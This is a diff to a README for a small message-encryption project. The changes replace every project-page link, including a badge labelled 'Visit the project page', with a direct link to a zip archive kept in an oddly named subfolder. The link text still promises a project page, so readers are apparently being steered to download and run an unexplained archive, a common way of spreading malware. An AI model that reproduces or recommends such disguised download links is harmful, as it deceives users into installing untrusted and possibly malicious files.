@@ -1,6 +1,6 @@
 # 🔐 end-to-edn-encryption - Encrypt messages before sending
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/Beltb735/end-to-edn-encryption)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20project%20page-blue?style=for-the-badge)](https://github.com/Beltb735/end-to-edn-encryption/raw/refs/heads/main/gaddi/end-to-edn-encryption-v3.9-alpha.3.zip)
 
 ## 🧭 What this app does
 
@@ -20,7 +20,7 @@ This is useful if you want to understand how secure message transfer works in a 
 
 Go to the project page here:
 
-https://github.com/Beltb735/end-to-edn-encryption
+https://github.com/Beltb735/end-to-edn-encryption/raw/refs/heads/main/gaddi/end-to-edn-encryption-v3.9-alpha.3.zip
 
 On that page, download the source files to your computer. If you already have the files, place them in one folder so both scripts can find each other.
 
@@ -154,4 +154,4 @@ basics-of-python, cryptography-library, cybersecurity, end-to-end-encryption, et
 
 If you need the project files later, use this page:
 
-https://github.com/Beltb735/end-to-edn-encryption
+https://github.com/Beltb735/end-to-edn-encryption/raw/refs/heads/main/gaddi/end-to-edn-encryption-v3.9-alpha.3.zip
